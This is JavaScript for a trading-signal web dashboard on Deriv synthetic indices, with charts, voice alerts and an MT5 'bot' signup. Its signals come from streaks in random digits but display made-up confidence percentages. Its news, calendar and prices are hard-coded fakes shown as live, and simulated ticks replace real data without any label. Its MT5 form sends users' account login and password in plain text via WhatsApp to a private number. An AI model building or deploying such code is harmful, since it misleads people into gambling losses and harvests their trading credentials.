// ============ CONFIGURATION ============
const CONFIG = {
    currentMarket: 'R_100',
    currentTradeType: 'rise_fall', // over_under, even_odd, matches_differs, rise_fall
    voiceEnabled: true,
    voiceGender: 'male',
    digitsHistory: [],
    priceData: [],
    maxHistory: 100,
    digitsData: Array(10).fill(0),
    signalHistory: [],
    isConnected: false,
    ws: null,
    requestId: 1,
    pendingRequests: new Map()
};

// Deriv WebSocket URL (Public Test App ID)
const DERIV_WS_URL = 'wss://ws.binaryws.com/websockets/v3?app_id=1089';

// ============ LOADER HANDLING ============
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        const loader = document.getElementById('loader');
        const mainContent = document.getElementById('mainContent');
        
        loader.style.opacity = '0';
        setTimeout(() => {
            loader.style.display = 'none';
            mainContent.style.display = 'block';
            initializeApp();
        }, 500);
    }, 5000); // 5 second elegant loader
});

// ============ INITIALIZATION ============
async function initializeApp() {
    initializeMarkets();
    initializeCharts();
    initializeVoice();
    setupEventListeners();
    loadNews();
    loadEconomicCalendar();
    loadCommodities();
    connectDerivWebSocket();
    startDataSimulation(); // Fallback if WebSocket fails
}

// ============ MARKET INITIALIZATION ============
function initializeMarkets() {
    const markets = [
        { id: 'R_10', name: 'Vol 10', icon: 'fa-bolt' },
        { id: 'R_25', name: 'Vol 25', icon: 'fa-bolt' },
        { id: 'R_50', name: 'Vol 50', icon: 'fa-bolt' },
        { id: 'R_75', name: 'Vol 75', icon: 'fa-bolt' },
        { id: 'R_100', name: 'Vol 100', icon: 'fa-bolt' }
    ];
    
    const marketGrid = document.getElementById('marketGrid');
    marketGrid.innerHTML = markets.map(market => `
        <button class="market-btn px-3 py-1.5 rounded-lg text-xs whitespace-nowrap transition ${CONFIG.currentMarket === market.id ? 'bg-gradient-to-r from-blue-600 to-purple-600' : 'bg-gray-800/50'}" data-market="${market.id}">
            <i class="fas ${market.icon} mr-1"></i>${market.name}
        </button>
    `).join('');
    
    document.querySelectorAll('.market-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.market-btn').forEach(b => b.classList.remove('bg-gradient-to-r', 'from-blue-600', 'to-purple-600'));
            btn.classList.add('bg-gradient-to-r', 'from-blue-600', 'to-purple-600');
            CONFIG.currentMarket = btn.dataset.market;
            updateConnectionStatus(`Switched to ${CONFIG.currentMarket}`, true);
        });
    });
    
    // Trading type buttons
    document.querySelectorAll('.trade-type-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.trade-type-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            CONFIG.currentTradeType = btn.dataset.type;
            updateConnectionStatus(`Trading type: ${CONFIG.currentTradeType.replace('_', ' ').toUpperCase()}`, true);
        });
    });
}

// ============ CHART INITIALIZATION ============
let priceChart, digitsChart;

function initializeCharts() {
    // Price Chart
    const priceCtx = document.getElementById('priceChart').getContext('2d');
    priceChart = new Chart(priceCtx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Price',
                data: [],
                borderColor: '#667eea',
                backgroundColor: 'rgba(102, 126, 234, 0.1)',
                tension: 0.4,
                fill: true,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: { legend: { display: false } },
            scales: {
                y: { grid: { color: '#374151' }, ticks: { color: '#9CA3AF', font: { size: 10 } } },
                x: { grid: { display: false }, ticks: { display: false } }
            }
        }
    });
    
    // Digits Donut Chart
    const digitsCtx = document.getElementById('digitsDonut').getContext('2d');
    digitsChart = new Chart(digitsCtx, {
        type: 'doughnut',
        data: {
            labels: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            datasets: [{
                data: CONFIG.digitsData,
                backgroundColor: ['#ef4444', '#f59e0b', '#eab308', '#84cc16', '#10b981', '#06b6d4', '#3b82f6', '#8b5cf6', '#d946ef', '#ec4899'],
                borderWidth: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: { legend: { position: 'bottom', labels: { color: '#9CA3AF', font: { size: 9 } } } }
        }
    });
}

// ============ DERIV WEBSOCKET ============
function connectDerivWebSocket() {
    updateConnectionStatus('Connecting to Deriv...', false);
    
    CONFIG.ws = new WebSocket(DERIV_WS_URL);
    
    CONFIG.ws.onopen = () => {
        CONFIG.isConnected = true;
        updateConnectionStatus('Connected to Deriv', true);
        subscribeToTicks();
    };
    
    CONFIG.ws.onmessage = (event) => {
        const response = JSON.parse(event.data);
        handleDerivResponse(response);
    };
    
    CONFIG.ws.onerror = (error) => {
        console.error('WebSocket error:', error);
        updateConnectionStatus('Connection error', false);
    };
    
    CONFIG.ws.onclose = () => {
        CONFIG.isConnected = false;
        updateConnectionStatus('Disconnected, retrying...', false);
        setTimeout(connectDerivWebSocket, 5000);
    };
}

function sendRequest(msgType, params = {}) {
    return new Promise((resolve, reject) => {
        if (!CONFIG.ws || CONFIG.ws.readyState !== WebSocket.OPEN) {
            reject(new Error('WebSocket not connected'));
            return;
        }
        
        const reqId = CONFIG.requestId++;
        const request = { [msgType]: 1, req_id: reqId, ...params };
        CONFIG.pendingRequests.set(reqId, { resolve, reject });
        
        setTimeout(() => {
            if (CONFIG.pendingRequests.has(reqId)) {
                CONFIG.pendingRequests.delete(reqId);
                reject(new Error('Request timeout'));
            }
        }, 10000);
        
        CONFIG.ws.send(JSON.stringify(request));
    });
}

function subscribeToTicks() {
    sendRequest('ticks', { ticks: CONFIG.currentMarket, subscribe: 1 })
        .then(() => console.log('Subscribed to ticks'))
        .catch(err => console.error('Subscription failed:', err));
}

function handleDerivResponse(response) {
    // Handle pending requests
    if (response.req_id && CONFIG.pendingRequests.has(response.req_id)) {
        const { resolve, reject } = CONFIG.pendingRequests.get(response.req_id);
        CONFIG.pendingRequests.delete(response.req_id);
        if (response.error) reject(response.error);
        else resolve(response);
        return;
    }
    
    // Handle tick updates
    if (response.msg_type === 'tick' && response.tick) {
        processTick(response.tick);
    }
}

// ============ DATA PROCESSING ============
function processTick(tick) {
    const price = parseFloat(tick.quote);
    CONFIG.priceData.push(price);
    if (CONFIG.priceData.length > CONFIG.maxHistory) CONFIG.priceData.shift();
    
    // Extract digit (last decimal or last digit of whole number)
    const priceStr = price.toString();
    const decimalMatch = priceStr.match(/\.(\d)/);
    const digit = decimalMatch ? parseInt(decimalMatch[1]) : Math.floor(price) % 10;
    
    CONFIG.digitsHistory.push(digit);
    if (CONFIG.digitsHistory.length > CONFIG.maxHistory) CONFIG.digitsHistory.shift();
    
    // Update digit frequency
    CONFIG.digitsData = Array(10).fill(0);
    CONFIG.digitsHistory.forEach(d => CONFIG.digitsData[d]++);
    
    // Update displays
    updatePriceDisplay(price);
    updateDigitsDisplay();
    updateCharts();
    
    // Run analysis
    analyzeSignals(price, digit);
}

function updatePriceDisplay(price) {
    document.getElementById('lastPrice').textContent = price.toFixed(4);
    
    if (CONFIG.priceData.length > 1) {
        const prevPrice = CONFIG.priceData[CONFIG.priceData.length - 2];
        const change = ((price - prevPrice) / prevPrice * 100).toFixed(2);
        const changeEl = document.getElementById('priceChange');
        changeEl.textContent = `${change >= 0 ? '+' : ''}${change}%`;
        changeEl.className = `font-bold ${change >= 0 ? 'text-green-400' : 'text-red-400'}`;
    }
    
    document.getElementById('highPrice').textContent = Math.max(...CONFIG.priceData).toFixed(4);
    document.getElementById('lowPrice').textContent = Math.min(...CONFIG.priceData).toFixed(4);
}

function updateDigitsDisplay() {
    const statsDiv = document.getElementById('digitsStats');
    const total = CONFIG.digitsHistory.length || 1;
    
    statsDiv.innerHTML = CONFIG.digitsData.map((count, i) => `
        <div class="flex justify-between items-center text-xs">
            <span class="w-6">${i}</span>
            <div class="flex-1 mx-2 bg-gray-700 rounded-full h-1.5">
                <div class="h-1.5 rounded-full" style="width: ${(count / total) * 100}%; background: ${digitsChart.data.datasets[0].backgroundColor[i]}"></div>
            </div>
            <span class="w-8 text-right">${count}</span>
        </div>
    `).join('');
    
    // Calculate over/under percentages
    const overDigits = [5, 6, 7, 8, 9];
    const underDigits = [0, 1, 2, 3, 4];
    
    let overCount = CONFIG.digitsHistory.filter(d => overDigits.includes(d)).length;
    let underCount = CONFIG.digitsHistory.filter(d => underDigits.includes(d)).length;
    
    document.getElementById('overTrend').textContent = `${((overCount / total) * 100).toFixed(1)}%`;
    document.getElementById('underTrend').textContent = `${((underCount / total) * 100).toFixed(1)}%`;
    
    const dominantDigit = CONFIG.digitsData.indexOf(Math.max(...CONFIG.digitsData));
    document.getElementById('dominantDigit').textContent = dominantDigit;
}

function updateCharts() {
    if (priceChart) {
        priceChart.data.datasets[0].data = CONFIG.priceData;
        priceChart.update();
    }
    
    if (digitsChart) {
        digitsChart.data.datasets[0].data = CONFIG.digitsData;
        digitsChart.update();
    }
}

// ============ SIGNAL ANALYSIS ============
function analyzeSignals(price, digit) {
    let signal = null;
    let confidence = 0;
    let reasons = [];
    
    // Calculate indicators
    const rsi = calculateRSI(CONFIG.priceData, 14);
    const sma20 = calculateSMA(CONFIG.priceData, 20);
    const sma50 = calculateSMA(CONFIG.priceData, 50);
    
    // Update indicators display
    updateIndicatorsDisplay(rsi, sma20, sma50);
    
    // Different analysis based on trade type
    switch(CONFIG.currentTradeType) {
        case 'over_under':
            const overDigits = [5, 6, 7, 8, 9];
            const underDigits = [0, 1, 2, 3, 4];
            const recentOver = CONFIG.digitsHistory.slice(-10).filter(d => overDigits.includes(d)).length;
            
            if (recentOver >= 7) {
                signal = 'OVER 5';
                confidence = 75 + (recentOver - 7) * 5;
                reasons.push(`${recentOver}/10 recent digits over 5`);
            } else if (recentOver <= 3) {
                signal = 'UNDER 5';
                confidence = 75 + (3 - recentOver) * 5;
                reasons.push(`${10 - recentOver}/10 recent digits under 5`);
            }
            break;
            
        case 'even_odd':
            const isEven = digit % 2 === 0;
            const recentEven = CONFIG.digitsHistory.slice(-10).filter(d => d % 2 === 0).length;
            
            if (recentEven >= 7) {
                signal = 'EVEN';
                confidence = 70 + (recentEven - 7) * 5;
                reasons.push(`${recentEven}/10 recent digits even`);
            } else if (recentEven <= 3) {
                signal = 'ODD';
                confidence = 70 + (3 - recentEven) * 5;
                reasons.push(`${10 - recentEven}/10 recent digits odd`);
            }
            break;
            
        case 'matches_differs':
            if (CONFIG.digitsHistory.length >= 2) {
                const lastTwo = CONFIG.digitsHistory.slice(-2);
                if (lastTwo[0] === lastTwo[1]) {
                    signal = 'MATCHES';
                    confidence = 65;
                    reasons.push('Last two digits matched');
                } else {
                    signal = 'DIFFERS';
                    confidence = 55;
                    reasons.push('Last two digits differed');
                }
            }
            break;
            
        case 'rise_fall':
            if (rsi !== null) {
                if (rsi < 30) {
                    signal = 'RISE';
                    confidence = 80;
                    reasons.push(`RSI oversold: ${rsi.toFixed(1)}`);
                } else if (rsi > 70) {
                    signal = 'FALL';
                    confidence = 80;
                    reasons.push(`RSI overbought: ${rsi.toFixed(1)}`);
                } else if (sma20 && sma50 && sma20 > sma50) {
                    signal = 'RISE';
                    confidence = 65;
                    reasons.push('Golden crossover setup');
                } else if (sma20 && sma50 && sma20 < sma50) {
                    signal = 'FALL';
                    confidence = 65;
                    reasons.push('Death crossover setup');
                }
            }
            break;
    }
    
    // Generate signal if conditions met
    if (signal && confidence > 55) {
        generateSignal(signal, confidence, reasons);
    }
}

function calculateRSI(prices, period) {
    if (prices.length < period + 1) return null;
    
    let gains = 0, losses = 0;
    for (let i = prices.length - period; i < prices.length; i++) {
        const change = prices[i] - prices[i - 1];
        if (change >= 0) gains += change;
        else losses -= change;
    }
    
    const avgGain = gains / period;
    const avgLoss = losses / period;
    
    if (avgLoss === 0) return 100;
    const rs = avgGain / avgLoss;
    return 100 - (100 / (1 + rs));
}

function calculateSMA(prices, period) {
    if (prices.length < period) return null;
    const sum = prices.slice(-period).reduce((a, b) => a + b, 0);
    return sum / period;
}

function updateIndicatorsDisplay(rsi, sma20, sma50) {
    const indicatorsDiv = document.getElementById('indicators');
    indicatorsDiv.innerHTML = `
        <div class="flex justify-between">
            <span>RSI (14):</span>
            <span class="${rsi && rsi > 70 ? 'text-red-400' : rsi && rsi < 30 ? 'text-green-400' : 'text-white'}">${rsi ? rsi.toFixed(1) : 'N/A'}</span>
        </div>
        <div class="flex justify-between">
            <span>SMA 20:</span>
            <span>${sma20 ? sma20.toFixed(4) : 'N/A'}</span>
        </div>
        <div class="flex justify-between">
            <span>SMA 50:</span>
            <span>${sma50 ? sma50.toFixed(4) : 'N/A'}</span>
        </div>
    `;
}

function generateSignal(signal, confidence, reasons) {
    const signalDiv = document.getElementById('currentSignal');
    const isBullish = signal === 'RISE' || signal === 'OVER 5' || signal === 'EVEN' || signal === 'MATCHES';
    
    signalDiv.className = `p-3 rounded-lg text-center transition-all signal-active ${isBullish ? 'bg-green-900/30 border border-green-500' : 'bg-red-900/30 border border-red-500'}`;
    signalDiv.innerHTML = `
        <i class="fas ${isBullish ? 'fa-arrow-up' : 'fa-arrow-down'} text-2xl ${isBullish ? 'text-green-400' : 'text-red-400'} mb-1"></i>
        <p class="text-xl font-bold ${isBullish ? 'text-green-400' : 'text-red-400'}">${signal}</p>
        <p class="text-xs text-gray-300">Confidence: ${confidence.toFixed(0)}%</p>
        <div class="text-xs text-gray-400 mt-1">${reasons.map(r => `<span class="inline-block px-1.5 py-0.5 bg-gray-800 rounded mr-1 mt-1">${r}</span>`).join('')}</div>
        <p class="text-xs text-gray-500 mt-2">${CONFIG.currentMarket} | ${new Date().toLocaleTimeString()}</p>
    `;
    
    // Voice alert
    speak(`${signal} signal detected with ${confidence.toFixed(0)} percent confidence`);
    playAlertSound();
    
    // Add to history
    addToSignalHistory(signal, confidence);
}

function addToSignalHistory(signal, confidence) {
    CONFIG.signalHistory.unshift({ signal, confidence, time: new Date().toLocaleTimeString(), market: CONFIG.currentMarket });
    if (CONFIG.signalHistory.length > 10) CONFIG.signalHistory.pop();
    
    const historyDiv = document.getElementById('signalHistory');
    historyDiv.innerHTML = CONFIG.signalHistory.map(s => `
        <div class="flex justify-between items-center p-1.5 bg-gray-800/30 rounded text-xs">
            <div class="flex items-center">
                <i class="fas ${s.signal === 'RISE' || s.signal === 'OVER 5' || s.signal === 'EVEN' || s.signal === 'MATCHES' ? 'fa-arrow-up text-green-400' : 'fa-arrow-down text-red-400'} mr-1"></i>
                <span class="font-semibold">${s.signal}</span>
            </div>
            <span class="text-gray-400">${s.market}</span>
            <span class="text-gray-500">${s.time}</span>
            <span class="${s.confidence > 70 ? 'text-green-400' : 'text-yellow-400'}">${s.confidence.toFixed(0)}%</span>
        </div>
    `).join('');
}

// ============ VOICE SYSTEM ============
function initializeVoice() {
    const voiceToggle = document.getElementById('voiceToggle');
    const voiceGender = document.getElementById('voiceGender');
    
    voiceToggle.addEventListener('click', () => {
        CONFIG.voiceEnabled = !CONFIG.voiceEnabled;
        voiceToggle.style.background = CONFIG.voiceEnabled ? '#22c55e' : '#4b5563';
        speak(CONFIG.voiceEnabled ? 'Voice alerts enabled' : 'Voice alerts disabled');
    });
    
    voiceGender.addEventListener('change', (e) => {
        CONFIG.voiceGender = e.target.value;
    });
}

function speak(message) {
    if (!CONFIG.voiceEnabled) return;
    
    const utterance = new SpeechSynthesisUtterance(message);
    utterance.rate = 0.9;
    utterance.pitch = CONFIG.voiceGender === 'male' ? 1 : 1.2;
    speechSynthesis.speak(utterance);
}

function playAlertSound() {
    const audio = document.getElementById('alertSound');
    audio.currentTime = 0;
    audio.play().catch(e => console.log('Audio play failed'));
}

// ============ NEWS & DATA ============
function loadNews() {
    const news = [
        { title: 'Federal Reserve signals rate cut in September', impact: 'high', time: '2h ago', source: 'Bloomberg' },
        { title: 'Gold hits all-time high above $2,400', impact: 'high', time: '3h ago', source: 'Reuters' },
        { title: 'Oil prices surge 5% on Middle East tensions', impact: 'medium', time: '5h ago', source: 'CNBC' },
        { title: 'Bitcoin volatility expected ahead of halving', impact: 'medium', time: '6h ago', source: 'CoinDesk' },
        { title: 'European markets close higher on tech rally', impact: 'low', time: '8h ago', source: 'FT' },
        { title: 'Bank of Japan intervenes to support Yen', impact: 'high', time: '12h ago', source: 'Nikkei' }
    ];
    
    const newsFeed = document.getElementById('newsFeed');
    newsFeed.innerHTML = news.map(item => `
        <div class="bg-gray-800/30 rounded-lg p-2">
            <div class="flex justify-between items-center mb-1">
                <span class="text-xs font-semibold text-purple-400">${item.source}</span>
                <span class="text-xs text-gray-500">${item.time}</span>
            </div>
            <p class="text-xs text-white">${item.title}</p>
            <div class="mt-1">
                <span class="text-xs px-1.5 py-0.5 rounded ${item.impact === 'high' ? 'bg-red-900/50 text-red-400' : item.impact === 'medium' ? 'bg-yellow-900/50 text-yellow-400' : 'bg-gray-700 text-gray-400'}">${item.impact.toUpperCase()}</span>
            </div>
        </div>
    `).join('');
}

function loadEconomicCalendar() {
    const events = [
        { time: '10:30 AM', currency: 'USD', event: 'Fed Chair Powell Speech', impact: 'high' },
        { time: '08:30 AM', currency: 'EUR', event: 'ECB Interest Rate Decision', impact: 'high' },
        { time: '04:30 AM', currency: 'JPY', event: 'Japan CPI Data', impact: 'medium' },
        { time: '02:00 PM', currency: 'GBP', event: 'UK GDP Report', impact: 'high' }
    ];
    
    const calendar = document.getElementById('economicCalendar');
    calendar.innerHTML = events.map(event => `
        <div class="flex justify-between items-center p-2 bg-gray-800/30 rounded">
            <div>
                <p class="text-xs font-semibold">${event.event}</p>
                <p class="text-xs text-gray-400">${event.time} | ${event.currency}</p>
            </div>
            <span class="text-xs px-1.5 py-0.5 rounded ${event.impact === 'high' ? 'bg-red-900/50 text-red-400' : 'bg-yellow-900/50 text-yellow-400'}">${event.impact}</span>
        </div>
    `).join('');
}

function loadCommodities() {
    const commodities = [
        { name: 'Gold', price: 2350.50, change: '+1.2%', isUp: true },
        { name: 'Silver', price: 28.75, change: '+0.8%', isUp: true },
        { name: 'Crude Oil', price: 85.30, change: '-0.5%', isUp: false },
        { name: 'Bitcoin', price: 62450, change: '+2.3%', isUp: true },
        { name: 'S&P 500', price: 5120, change: '+0.3%', isUp: true }
    ];
    
    const commoditiesDiv = document.getElementById('commodities');
    commoditiesDiv.innerHTML = commodities.map(comm => `
        <div class="flex justify-between items-center p-2 bg-gray-800/30 rounded">
            <span class="text-sm font-semibold">${comm.name}</span>
            <span class="text-sm">$${comm.price.toLocaleString()}</span>
            <span class="text-sm ${comm.isUp ? 'text-green-400' : 'text-red-400'}">${comm.change}</span>
        </div>
    `).join('');
}

// ============ FALLBACK DATA SIMULATION ============
function startDataSimulation() {
    let price = 100;
    setInterval(() => {
        if (!CONFIG.isConnected || CONFIG.priceData.length === 0) {
            const change = (Math.random() - 0.5) * 2;
            price = Math.max(0.01, price + change);
            const digit = Math.floor(Math.abs(price)) % 10;
            processTick({ quote: price });
        }
    }, 2000);
}

// ============ EVENT LISTENERS ============
function setupEventListeners() {
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const tabId = btn.dataset.tab;
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(content => content.classList.add('hidden'));
            document.getElementById(`${tabId}Tab`).classList.remove('hidden');
        });
    });
    
    // MT5 Form
    document.getElementById('mt5Form').addEventListener('submit', (e) => {
        e.preventDefault();
        const login = document.getElementById('mt5Login').value;
        const password = document.getElementById('mt5Password').value;
        const server = document.getElementById('mt5Server').value;
        
        if (!login || !password) {
            alert('Please fill in all MT5 credentials');
            return;
        }
        
        const message = `*KAIRON MT5 Bot Request*%0A%0A*Login:* ${login}%0A*Password:* ${password}%0A*Server:* ${server}`;
        window.open(`https://wa.me/254799045699?text=${message}`, '_blank');
        alert('Credentials sent! Our team will activate your bot within 24 hours.');
        document.getElementById('mt5Form').reset();
    });
    
    // Affiliate link
    document.getElementById('affiliateLink').addEventListener('click', (e) => {
        e.preventDefault();
        window.open('https://track.binary.com/affiliate', '_blank');
    });
    
    // Manual analysis button
    document.getElementById('manualAnalysisBtn').addEventListener('click', () => {
        if (CONFIG.priceData.length > 0) {
            analyzeSignals(CONFIG.priceData[CONFIG.priceData.length - 1], CONFIG.digitsHistory[CONFIG.digitsHistory.length - 1]);
        }
    });
}

function updateConnectionStatus(message, isConnected) {
    const statusDiv = document.getElementById('connectionStatus');
    const dotColor = isConnected ? 'bg-green-500' : 'bg-yellow-500 animate-pulse';
    statusDiv.innerHTML = `
        <div class="w-2 h-2 rounded-full ${dotColor} mr-1"></div>
        <span class="text-xs">${message}</span>
    `;
}
